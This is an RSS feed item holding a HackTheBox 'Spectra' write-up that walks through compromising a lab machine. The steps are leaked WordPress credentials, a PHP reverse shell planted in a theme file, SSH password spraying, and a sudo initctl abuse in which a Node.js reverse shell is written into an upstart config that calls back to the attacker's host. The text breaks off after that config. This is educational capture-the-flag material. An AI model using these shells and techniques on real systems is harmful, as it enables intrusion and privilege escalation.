<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>HackTheBox on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/writeups/hackthebox/</link>
    <description>Recent content in HackTheBox on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 19 May 2021 01:32:22 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/writeups/hackthebox/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Spectra</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</link>
      <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</guid>
      <description>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts with enumerating a WordPress website which has directory listing enabled, and it exposes a config file that contains a database password. The password can be used to login into the admin dashboard, allowing me to insert a PHP reverse shell into the web page and gain a foothold on the system. Internal enumeration finds another password used for auto-login, and it can be used to escalate to user.</description>
      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts with enumerating a WordPress website which has directory listing enabled, and it exposes a config file that contains a database password. The password can be used to login into the admin dashboard, allowing me to insert a PHP reverse shell into the web page and gain a foothold on the system. Internal enumeration finds another password used for auto-login, and it can be used to escalate to user. The user has sudo privileges on <code>initctl</code>, and this can be leveraged to get a root shell.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploiting WordPress</li>
<li>Command Injection</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-15 10:10 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.229
Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.052s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65532</span> closed ports
Reason: <span style="color:#ae81ff">65532</span> resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
80/tcp   open  http    syn-ack ttl <span style="color:#ae81ff">63</span> nginx 1.17.4
3306/tcp open  mysql   syn-ack ttl <span style="color:#ae81ff">63</span> MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 123.14 seconds
</code></pre></div><p>MySQL service is normally tied to 127.0.0.1, but <code>nmap</code> already identified that I have no access there.</p>
<p>Running a script scan didn&rsquo;t find any interesting information.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---spectrahtb">TCP 80 - spectra.htb</h3>
<p>The site appears to be under development.</p>
<p><img class="img-container" src="imgs/image-20210515212024368.png" alt="image-20210515212024368"  />
</p>
<p>Inspecting page source discovers a hostname and two directories:</p>
<ul>
<li><a href="http://spectra.htb/main/index.php">http://spectra.htb/main/index.php</a></li>
<li><a href="http://spectra.htb/testing/index.php">http://spectra.htb/testing/index.php</a></li>
</ul>
<p><img class="img-container" src="imgs/image-20210515212038877.png" alt="image-20210515212038877"  />
</p>
<p>I&rsquo;ll update my <code>/etc/hosts</code> with the hostname.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ echo <span style="color:#e6db74">&#39;10.10.10.229 spectra.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Poking with <code>curl</code>, shows that with or without the hostname it&rsquo;s the same site.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «~» «10.10.14.9» 
$ curl -s http://spectra.htb/ | wc -c
<span style="color:#ae81ff">283</span>
→ root@kali «~» «10.10.14.9» 
$ curl -s http://10.10.10.229 | wc -c
<span style="color:#ae81ff">283</span>
</code></pre></div><p>Clicking on &ldquo;<strong>Software Issue Tracker</strong>&rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.</p>
<p><img class="img-container" src="imgs/image-20210626224157109.png" alt="image-20210626224157109"  />
</p>
<p>Visiting &ldquo;<strong>Test</strong>&rdquo;, the site page shows an error message about database connection.</p>
<p><img class="img-container" src="imgs/image-20210515214125642.png" alt="image-20210515214125642"  />
</p>
<p>Removing <code>index.php</code> from URL, discovers that this page has directory listing is enabled.</p>
<p><img class="img-container" src="imgs/image-20210515221118144.png" alt="image-20210515221118144"  />
</p>
<p>The  <code>wp-config.php.save</code> file draws my attention. It contains a set of database credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ curl http://spectra.htb/testing/wp-config.php.save
&lt;?php
...&lt;SNIP&gt;...

define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database username */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;devtest&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database password */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;devteam01&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL hostname */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">)</span>;
...&lt;SNIP&gt;...
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nginx">Shell as nginx</h3>
<h4 id="wp-admin-dashboard">WP-Admin Dashboard</h4>
<p>The database password works with administrator (<code>administrator:devteam01</code>), it allows me to access the admin dashboard.</p>
<p><img class="img-container" src="imgs/image-20210626225944808.png" alt="image-20210626225944808"  />
</p>
<h4 id="injecting-reverse-shell">Injecting Reverse Shell</h4>
<p>Armed with administrator access, I could inject a PHP reverse shell script into one of the available themes' page and execute it by visiting the page URL.</p>
<p>I&rsquo;ll put my <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> in <code>404.php</code> file of the Twenty Nineteen theme. The file can be found at <strong>Appearance</strong> &gt; <strong>Theme Editor</strong>.</p>
<p><img class="img-container" src="imgs/image-20210515231108016.png" alt="image-20210515231108016"  />
</p>
<p>I&rsquo;ll access this URL to get a shell: <code>http://spectra.htb/main/wp-content/themes/twentynineteen/404.php</code>, but it returns an error message pointing on line 12.</p>
<p><img class="img-container" src="imgs/image-20210515231346411.png" alt="image-20210515231346411"  />
</p>
<p>I&rsquo;m able to resolve the error by commenting out the line 12.</p>
<p><img class="img-container" src="imgs/image-20210515231422348.png" alt="image-20210515231422348"  />
</p>
<p>This time, I&rsquo;ll trigger the reverse shell using <code>curl</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
</code></pre></div><p>On my listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">35166</span>
Linux spectra 5.4.66+ <span style="color:#75715e">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux</span>
 09:14:42 up 10:53,  <span style="color:#ae81ff">0</span> users,  load average: 0.02, 0.04, 0.00
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid<span style="color:#f92672">=</span>20155<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span>
$ id
uid<span style="color:#f92672">=</span>20155<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span>
$ hostname
spectra
</code></pre></div><h4 id="shell-upgrade">Shell upgrade</h4>
<p>I need to use the full path to upgrade my shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ which python3
which: no python3 in <span style="color:#f92672">((</span>null<span style="color:#f92672">))</span>
$ ls /usr/bin/ | grep python 
python
python-config
python-wrapper
python2
python2.7
python3
python3.6
python3.6m
$ /usr/bin/python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
nginx@spectra / $ export TERM<span style="color:#f92672">=</span>xterm
nginx@spectra / $ ^Z
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7285</span> suspended  nc -nvlp <span style="color:#ae81ff">9001</span>
→ root@kali «spectra» «10.10.14.21» 
$ stty raw -echo; fg
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7285</span> continued  nc -nvlp <span style="color:#ae81ff">9001</span>

nginx@spectra / $ 
</code></pre></div><p>I&rsquo;ll add <code>/usr/bin</code> to current PATH variable, so I don&rsquo;t have to call binary&rsquo;s full path.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ env
TERM<span style="color:#f92672">=</span>xterm
USER<span style="color:#f92672">=</span>nginx
PWD<span style="color:#f92672">=</span>/
SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
HOME<span style="color:#f92672">=</span>/home/nginx
_<span style="color:#f92672">=</span>/usr/bin/env
nginx@spectra / $ export PATH<span style="color:#f92672">=</span>$PATH:/usr/bin 
nginx@spectra / $ which python
/usr/local/bin/python
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-katie">Shell as katie</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are 4 users with login shell in this machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /etc/passwd | grep sh$  
root:x:0:0:root:/root:/bin/bash
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
nginx:x:20155:20156::/home/nginx:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
</code></pre></div><p>Enumerating home directory shows that the user flag is on <code>katie</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ ls -lR /home 2&gt;/dev/null
...&lt;SNIP&gt;...
/home/katie:
total <span style="color:#ae81ff">8</span>
drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 log
-r-------- <span style="color:#ae81ff">1</span> katie katie   <span style="color:#ae81ff">33</span> Feb  <span style="color:#ae81ff">2</span> 15:57 user.txt
...&lt;SNIP&gt;...
</code></pre></div><p>All the web files are located in <code>/usr/local/share/nginx/html/</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ find / -type f -name wp-config.php 2&gt;/dev/null
/usr/local/share/nginx/html/main/wp-config.php
/usr/local/share/nginx/html/testing/wp-config.php
/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
</code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has credentials with the one on <code>/testing</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
...&lt;SNIP&gt;...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database <span style="color:#66d9ef">for</span> WordPress */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database username */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database password */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;development01&#39;</span> <span style="color:#f92672">)</span>;
...&lt;SNIP&gt;...
</code></pre></div><p>In <code>/opt</code>, there is a file with uncommon extension called <code>autologin.conf.orig</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ cat autologin.conf.orig 
<span style="color:#75715e"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
<span style="color:#75715e"># Use of this source code is governed by a BSD-style license that can be</span>
<span style="color:#75715e"># found in the LICENSE file.</span>
description   <span style="color:#e6db74">&#34;Automatic login at boot&#34;</span>
author        <span style="color:#e6db74">&#34;chromium-os-dev@chromium.org&#34;</span>
<span style="color:#75715e"># After boot-complete starts, the login prompt is visible and is accepting</span>
<span style="color:#75715e"># input.</span>
start on started boot-complete
script
  passwd<span style="color:#f92672">=</span>
  <span style="color:#75715e"># Read password from file. The file may optionally end with a newline.</span>
  <span style="color:#66d9ef">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin; <span style="color:#66d9ef">do</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -e <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
      passwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
      break
    <span style="color:#66d9ef">fi</span>
  <span style="color:#66d9ef">done</span>
  <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>passwd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
    exit <span style="color:#ae81ff">0</span>
  <span style="color:#66d9ef">fi</span>
...&lt;SNIP&gt;...
</code></pre></div><p>Based on the comments, the file is an autologin script. It looks for <code>passwd</code> file in these directories:</p>
<ul>
<li><code>/mnt/stateful_partition/etc/autologin</code></li>
<li><code>/etc/autologin</code></li>
</ul>
<p>I found the <code>passwd</code> file which contains a password in the <code>/etc/autologin/</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ ls -l /etc/autologin/             
total <span style="color:#ae81ff">4</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">19</span> Feb  <span style="color:#ae81ff">3</span> 16:43 passwd
nginx@spectra /opt $ cat /etc/autologin/passwd 
SummerHereWeCome!!
</code></pre></div><h4 id="ssh---katie">SSH - katie</h4>
<p>I&rsquo;ll spray <code>SummerHereWeCome!!</code> and <code>development01</code> using <code>crackmapexec</code> to the users who have login shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_8.1
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:devteam01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:development01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:SummerHereWeCome!! Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> katie:devteam01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> katie:development01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> katie:SummerHereWeCome!!
</code></pre></div><p>The password <code>SummerHereWeCome!!</code> works on user <code>katie</code> .</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ ssh katie@10.10.10.229
Password: 
katie@spectra ~ $ id 
uid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span>,20158<span style="color:#f92672">(</span>developers<span style="color:#f92672">)</span>
</code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ ls -la
total <span style="color:#ae81ff">36</span>
drwxr-xr-x <span style="color:#ae81ff">5</span> katie katie <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">15</span> 12:17 .
drwxr-xr-x <span style="color:#ae81ff">8</span> root  root  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">2</span> 15:55 ..
lrwxrwxrwx <span style="color:#ae81ff">1</span> root  root     <span style="color:#ae81ff">9</span> Feb  <span style="color:#ae81ff">2</span> 15:55 .bash_history -&gt; /dev/null
-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">127</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">204</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bash_profile
-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">551</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bashrc
drwx------ <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">15</span> 12:17 .gnupg
drwx------ <span style="color:#ae81ff">3</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 .pki
drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 log
-r-------- <span style="color:#ae81ff">1</span> katie katie   <span style="color:#ae81ff">33</span> Feb  <span style="color:#ae81ff">2</span> 15:57 user.txt
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal Enumeration</h4>
<p>The first thing I will check if I have the user&rsquo;s password is the sudo privileges, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> SETENV: NOPASSWD: /sbin/initctl
</code></pre></div><p>Unfortunately, <code>initctl</code> is not listed on GTFObins site. I&rsquo;ll have to look around.</p>
<p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
    <span style="color:#ae81ff">32121</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test6.conf
    <span style="color:#ae81ff">32123</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test7.conf
    <span style="color:#ae81ff">32109</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test3.conf
    <span style="color:#ae81ff">32112</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test4.conf
    <span style="color:#ae81ff">32103</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test.conf
    <span style="color:#ae81ff">32126</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test8.conf
    <span style="color:#ae81ff">32128</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test9.conf
    <span style="color:#ae81ff">32106</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test10.conf
    <span style="color:#ae81ff">32108</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test2.conf
    <span style="color:#ae81ff">32120</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test5.conf
    <span style="color:#ae81ff">32105</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test1.conf
    <span style="color:#ae81ff">23763</span>      <span style="color:#ae81ff">4</span> -rwxrwxr-x   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">251</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /srv/nodetest.js
</code></pre></div><p>Those <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ cat /etc/init/test.conf 
description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
author      <span style="color:#e6db74">&#34;katie&#34;</span>

start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
stop on shutdown

script

    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
    echo $$ &gt; /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo <span style="color:#e6db74">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo <span style="color:#e6db74">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
end script
</code></pre></div><h4 id="abusing-sudo-initctl">Abusing sudo initctl</h4>
<p>The <code>/srv/nodetest.js</code> file itself is not important because with sudo privileges and write access on those configuration files, I can perform a command injection to send myself a reverse shell by leveraging <a href="https://gtfobins.github.io/gtfobins/node/#sudo">Node</a>.</p>
<p>I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
$ cat exploit.conf
description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
author      <span style="color:#e6db74">&#34;katie&#34;</span>

start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
stop on shutdown

script

    export RHOST<span style="color:#f92672">=</span>10.10.14.21
    export RPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span>
    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
    echo $$ &gt; /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span style="color:#e6db74">&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
</span><span style="color:#e6db74">    this.pipe(sh.stdin);
</span><span style="color:#e6db74">    sh.stdout.pipe(this);
</span><span style="color:#e6db74">    sh.stderr.pipe(this);
</span><span style="color:#e6db74">    })&#39;</span>
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script
